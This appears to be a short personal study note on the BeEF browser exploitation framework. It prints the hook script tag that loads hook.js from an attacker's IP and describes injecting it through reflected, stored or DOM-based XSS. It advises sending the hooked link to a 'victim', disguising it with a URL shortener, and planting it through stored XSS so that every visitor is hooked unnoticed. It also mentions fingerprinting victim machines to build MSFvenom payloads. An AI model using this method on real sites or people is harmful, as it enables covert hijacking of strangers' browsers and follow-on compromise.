#### Introduction :
this application hooks / hacks browsers if a javascript command is run

#### Hooking :
When the application is run it provides a hooking javascript code at the beginning which looks something like : `<script src="http://`<span style="color: cyan;">&ltIP&gt</span>`:3000/hook.js"</script>`
This can be used in Reflected, Stored or DOM-based XSS 
Ex :
![[BeEF 1.png]]

`Note : specify attackers IP in <IP> better to use URL shortener`

and if someone is hooked it will appear like this in the BeEF website :
![[BeEF 2.png]]

#### To Hook others :
##### For Reflected XSS :
To hook others browsers :
**send this hooked URL to your victim and you get a connection in the BeEF website**

##### For Stored XSS :
To hook others browsers :
**here the code injected in the website and the database stores this so anyone visiting the same page will get hooked automatically and the URL dosen't  look suspicious**

#### Exploits :
clicking on the IP address we get basic valuable information about the browser and also about the machine like x64 or arm etc. which can be handy while creating [[MSFvenom]]
and also you can run many other commands
